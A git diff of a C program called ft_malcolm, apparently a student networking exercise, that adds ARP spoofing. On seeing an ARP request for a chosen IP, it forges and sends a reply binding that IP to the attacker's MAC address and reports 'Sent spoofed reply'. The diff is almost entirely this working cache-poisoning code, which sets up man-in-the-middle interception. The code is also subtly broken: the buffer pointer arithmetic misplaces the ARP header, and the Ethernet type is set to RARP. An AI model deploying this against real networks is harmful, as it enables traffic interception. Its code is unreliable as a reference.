@@ -1,5 +1,7 @@
 #include "../inc/ft_malcolm.h"
 
+void send_arp(t_env *env, struct arp_header *arp_req);
+
 void signal_handler(int s)
 {
     (void)s;
@@ -79,11 +81,11 @@ void listen_for_arp(t_env *env)
         {
             struct arp_header *arp_req = (struct arp_header *)(buffer + sizeof(struct ethhdr));
             if (ntohs(arp_req->opcode) == ARPOP_REQUEST)
-                if (ft_memcmp(arp_req->sender_ip, &env->target_ip->sin_addr.s_addr, 4) == 0)
+                if (ft_memcmp(arp_req->target_ip, &env->target_ip->sin_addr.s_addr, 4) == 0)
                 {
                     printf("An ARP request has been brodcast\n");
                     print_packet(env->ver, arp_req, buffer);
-                    break;
+                    send_arp(env, arp_req);
                 }
         }
     }
@@ -93,4 +95,33 @@ void send_arp(t_env *env, struct arp_header *arp_req)
 {
     unsigned int packet[42];
     struct ethhdr *eth = (struct ethhdr *)packet;
+    struct arp_header *arp_reply = (struct arp_header *)(packet + sizeof(struct ethhdr));
+
+    ft_memcpy(eth->h_source, env->source_mac->str, ETH_ALEN);
+    ft_memcpy(eth->h_dest, arp_req->sender_mac, ETH_ALEN);
+    eth->h_proto = htons(ETH_P_RARP);
+
+    arp_reply->hardware_type = htons(ARPHRD_ETHER);
+    arp_reply->protocol_type = htons(ETH_P_IP);
+    arp_reply->hardware_len = ETH_ALEN;
+    arp_reply->protocol_len = 4;
+    arp_reply->opcode = htons(2);
+
+    ft_memcpy(arp_reply->sender_mac, env->source_mac->str, ETH_ALEN);
+    ft_memcpy(arp_reply->sender_ip, &env->source_ip->sin_addr, 4);
+    ft_memcpy(arp_reply->target_mac, arp_req->sender_mac, ETH_ALEN);
+    ft_memcpy(arp_reply->target_ip, arp_req->sender_ip, 4);
+
+    struct sockaddr_ll target_addr;
+    ft_memset(&target_addr, 0, sizeof(target_addr));
+    target_addr.sll_family = AF_PACKET;
+    target_addr.sll_protocol= htons(ETH_P_ARP);
+    target_addr.sll_ifindex = env->interf;
+    target_addr.sll_halen = ETH_ALEN;
+    ft_memcpy(target_addr.sll_addr, arp_req->sender_mac, ETH_ALEN);
+
+    if (sendto(env->sock_fd, packet, sizeof(packet), 0, (struct sockaddr*)&target_addr, sizeof(target_addr)) < 0)
+        dprintf(2, "Failed to send ARP request %d!\n", errno);
+    else
+        printf("Sent spoofed reply to %s, check ARP table\n", inet_ntoa(*(struct in_addr *)arp_req->sender_ip));
 }
